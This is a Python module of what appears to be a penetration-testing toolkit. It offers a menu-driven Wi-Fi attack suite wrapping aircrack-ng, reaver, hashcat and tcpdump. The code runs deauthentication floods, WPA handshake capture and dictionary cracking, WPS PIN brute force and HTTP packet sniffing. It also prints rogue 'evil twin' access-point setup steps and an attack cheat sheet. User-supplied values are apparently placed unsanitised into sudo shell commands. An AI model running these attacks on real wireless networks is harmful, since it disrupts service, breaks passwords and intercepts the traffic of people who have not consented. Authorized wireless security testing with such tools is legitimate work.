"""Wi-Fi Attack Suite — wireless penetration testing.

Deauth, handshake capture, evil twin, WPS attacks via aircrack-ng/bettercap.
"""

import sys
import os
import shutil

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel)
from executor import run_with_preview, run_command
from tool_manager import ensure_tool, check_tool

STAGE = "wifi"


def run(session):
    show_stage_header("Wi-Fi Attack Suite", "Wireless network penetration testing")

    warning("Wi-Fi attacks require a wireless adapter that supports monitor mode.")
    warning("macOS has limited support — a USB adapter (Alfa/TP-Link) is recommended.")
    console.print()

    while True:
        options = [
            ("1", "Scan for Wireless Networks"),
            ("2", "Enable Monitor Mode"),
            ("3", "Deauthentication Attack"),
            ("4", "Capture WPA/WPA2 Handshake"),
            ("5", "Crack WPA/WPA2 Handshake"),
            ("6", "WPS PIN Attack"),
            ("7", "Evil Twin / Rogue AP"),
            ("8", "Packet Sniffing"),
            ("9", "Bluetooth Scanning"),
            ("10", "Wi-Fi Cheat Sheet"),
            ("0", "Back to Main Menu"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _scan_networks(session)
        elif choice == "2":
            _monitor_mode(session)
        elif choice == "3":
            _deauth(session)
        elif choice == "4":
            _capture_handshake(session)
        elif choice == "5":
            _crack_handshake(session)
        elif choice == "6":
            _wps_attack(session)
        elif choice == "7":
            _evil_twin(session)
        elif choice == "8":
            _packet_sniff(session)
        elif choice == "9":
            _bluetooth_scan(session)
        elif choice == "10":
            _cheat_sheet()


def _get_interface():
    """Get wireless interface name."""
    info("Detecting wireless interfaces...")
    import platform
    if platform.system() == "Darwin":
        run_command("networksetup -listallhardwareports | grep -A 2 Wi-Fi", timeout=5)
        return ask("Enter wireless interface", default="en0")
    else:
        run_command("iwconfig 2>/dev/null || ip link show", timeout=5)
        return ask("Enter wireless interface", default="wlan0")


def _scan_networks(session):
    import platform
    if platform.system() == "Darwin":
        info("Scanning for Wi-Fi networks on macOS...")
        run_with_preview(
            "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s",
            session, STAGE
        )
    else:
        if ensure_tool("aircrack-ng"):
            iface = _get_interface()
            warning("This will start airodump-ng. Press Ctrl+C to stop.")
            run_with_preview(f"sudo airodump-ng {iface}", session, STAGE)


def _monitor_mode(session):
    import platform
    if platform.system() == "Darwin":
        warning("macOS monitor mode is limited. Use an external USB adapter for best results.")
        iface = _get_interface()
        run_with_preview(
            f"sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport {iface} sniff 1",
            session, STAGE
        )
    else:
        if not ensure_tool("aircrack-ng"):
            return
        iface = _get_interface()
        options = [
            ("1", "Enable monitor mode (airmon-ng)"),
            ("2", "Disable monitor mode"),
            ("3", "Kill interfering processes"),
            ("0", "Back"),
        ]
        choice = show_menu(options)
        if choice == "1":
            run_with_preview(f"sudo airmon-ng start {iface}", session, STAGE)
        elif choice == "2":
            run_with_preview(f"sudo airmon-ng stop {iface}mon", session, STAGE)
        elif choice == "3":
            run_with_preview("sudo airmon-ng check kill", session, STAGE)


def _deauth(session):
    if not ensure_tool("aircrack-ng"):
        return

    iface = ask("Monitor interface", default="wlan0mon")
    bssid = ask("Target AP BSSID (MAC address)")
    client = ask("Target client MAC (leave empty for broadcast)", default="")
    count = ask("Number of deauth packets (0=infinite)", default="10")

    cmd = f"sudo aireplay-ng --deauth {count} -a {bssid}"
    if client:
        cmd += f" -c {client}"
    cmd += f" {iface}"

    warning("Deauthentication attacks disrupt network connectivity!")
    run_with_preview(cmd, session, STAGE)


def _capture_handshake(session):
    if not ensure_tool("aircrack-ng"):
        return

    iface = ask("Monitor interface", default="wlan0mon")
    bssid = ask("Target AP BSSID")
    channel = ask("Channel", default="1")
    output = ask("Output file prefix", default="capture")

    info("Start the capture, then deauth a client to force a handshake.")
    info("Press Ctrl+C when you see 'WPA handshake: XX:XX:XX:XX:XX:XX'")
    console.print()

    run_with_preview(
        f"sudo airodump-ng --bssid {bssid} -c {channel} -w {output} {iface}",
        session, STAGE
    )


def _crack_handshake(session):
    options = [
        ("1", "aircrack-ng (CPU)"),
        ("2", "hashcat (GPU)"),
        ("0", "Back"),
    ]
    choice = show_menu(options)

    if choice == "0":
        return
    elif choice == "1":
        if not ensure_tool("aircrack-ng"):
            return
        capfile = ask("Capture file (.cap)")
        wordlist = ask("Wordlist", default="/usr/share/wordlists/rockyou.txt")
        run_with_preview(f"aircrack-ng -w {wordlist} {capfile}", session, STAGE)
    elif choice == "2":
        if not ensure_tool("hashcat"):
            return
        info("Convert .cap to .hc22000 first:")
        capfile = ask("Capture file (.cap)")

        if shutil.which("hcxpcapngtool"):
            run_with_preview(f"hcxpcapngtool -o hash.hc22000 {capfile}", session, STAGE)
        else:
            console.print("  [white]Use https://hashcat.net/cap2hashcat/ to convert online[/white]")
            capfile = ask("Converted hash file (.hc22000)")

        wordlist = ask("Wordlist", default="/usr/share/wordlists/rockyou.txt")
        run_with_preview(f"hashcat -m 22000 {capfile} {wordlist}", session, STAGE)


def _wps_attack(session):
    console.print("\n[bold cyan]WPS PIN Attack[/bold cyan]\n")

    if shutil.which("reaver"):
        iface = ask("Monitor interface", default="wlan0mon")
        bssid = ask("Target AP BSSID")
        run_with_preview(f"sudo reaver -i {iface} -b {bssid} -vv", session, STAGE)
    elif shutil.which("bully"):
        iface = ask("Monitor interface", default="wlan0mon")
        bssid = ask("Target AP BSSID")
        run_with_preview(f"sudo bully -b {bssid} {iface}", session, STAGE)
    else:
        warning("Neither reaver nor bully is installed.")
        console.print("  [white]brew install reaver[/white]  or  [white]apt install reaver[/white]\n")


def _evil_twin(session):
    console.print("\n[bold cyan]Evil Twin / Rogue AP[/bold cyan]")
    console.print("[dim]Create a fake access point to intercept traffic[/dim]\n")

    ssid = ask("SSID to clone")
    channel = ask("Channel", default="6")
    iface = ask("Wireless interface", default="wlan0")

    console.print("\n[bold yellow]Manual Setup Steps:[/bold yellow]\n")
    console.print(f"  [white]1. sudo airmon-ng start {iface}[/white]")
    console.print(f"  [white]2. sudo airbase-ng -e '{ssid}' -c {channel} {iface}mon[/white]")
    console.print(f"  [white]3. sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0 up[/white]")
    console.print(f"  [white]4. sudo dhcpd -cf /etc/dhcp/dhcpd.conf at0[/white]")
    console.print(f"  [white]5. sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE[/white]")
    console.print(f"  [white]6. sudo iptables -A FORWARD -i at0 -j ACCEPT[/white]")
    console.print(f"  [white]7. echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward[/white]\n")

    info("For automated evil twin, use: fluxion or wifiphisher")
    console.print("  [dim]github.com/FluxionNetwork/fluxion[/dim]")
    console.print("  [dim]github.com/wifiphisher/wifiphisher[/dim]\n")


def _packet_sniff(session):
    console.print("\n[bold cyan]Packet Sniffing[/bold cyan]\n")

    options = [
        ("1", "tcpdump — capture all traffic"),
        ("2", "tcpdump — capture specific host"),
        ("3", "tcpdump — capture specific port"),
        ("4", "tcpdump — capture HTTP traffic"),
        ("5", "Wireshark (GUI)"),
        ("0", "Back"),
    ]
    choice = show_menu(options)

    if choice == "0":
        return

    iface = _get_interface()

    if choice == "1":
        run_with_preview(f"sudo tcpdump -i {iface} -c 100 -v", session, STAGE)
    elif choice == "2":
        host = ask("Target host/IP")
        run_with_preview(f"sudo tcpdump -i {iface} host {host} -c 50 -v", session, STAGE)
    elif choice == "3":
        port = ask("Port number")
        run_with_preview(f"sudo tcpdump -i {iface} port {port} -c 50 -v", session, STAGE)
    elif choice == "4":
        run_with_preview(
            f"sudo tcpdump -i {iface} -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' -c 50",
            session, STAGE
        )
    elif choice == "5":
        if ensure_tool("wireshark"):
            run_with_preview("wireshark &", session, STAGE)


def _bluetooth_scan(session):
    console.print("\n[bold cyan]Bluetooth Scanning[/bold cyan]\n")

    import platform
    if platform.system() == "Darwin":
        info("macOS Bluetooth scanning:")
        run_with_preview("system_profiler SPBluetoothDataType", session, STAGE)
    else:
        if shutil.which("hcitool"):
            run_with_preview("sudo hcitool scan", session, STAGE)
        elif shutil.which("bluetoothctl"):
            info("Run: bluetoothctl → scan on → wait → scan off")
            run_with_preview("bluetoothctl -- scan on &", session, STAGE)
        else:
            warning("No Bluetooth tools found. Install: bluez")


def _cheat_sheet():
    console.print("\n[bold cyan]Wi-Fi Attack Cheat Sheet[/bold cyan]\n")

    commands = {
        "Scan Networks": "sudo airodump-ng wlan0mon",
        "Enable Monitor": "sudo airmon-ng start wlan0",
        "Disable Monitor": "sudo airmon-ng stop wlan0mon",
        "Kill Interfering": "sudo airmon-ng check kill",
        "Deauth (targeted)": "sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT> wlan0mon",
        "Deauth (broadcast)": "sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon",
        "Capture Handshake": "sudo airodump-ng --bssid <BSSID> -c <CH> -w capture wlan0mon",
        "Crack (aircrack)": "aircrack-ng -w wordlist.txt capture-01.cap",
        "Crack (hashcat)": "hashcat -m 22000 hash.hc22000 wordlist.txt",
        "WPS Attack": "sudo reaver -i wlan0mon -b <BSSID> -vv",
        "Fake AP": "sudo airbase-ng -e 'FreeWiFi' -c 6 wlan0mon",
        "Packet Capture": "sudo tcpdump -i wlan0mon -w capture.pcap",
    }

    for name, cmd in commands.items():
        console.print(f"  [yellow]{name}:[/yellow]")
        console.print(f"    [white]{cmd}[/white]\n")
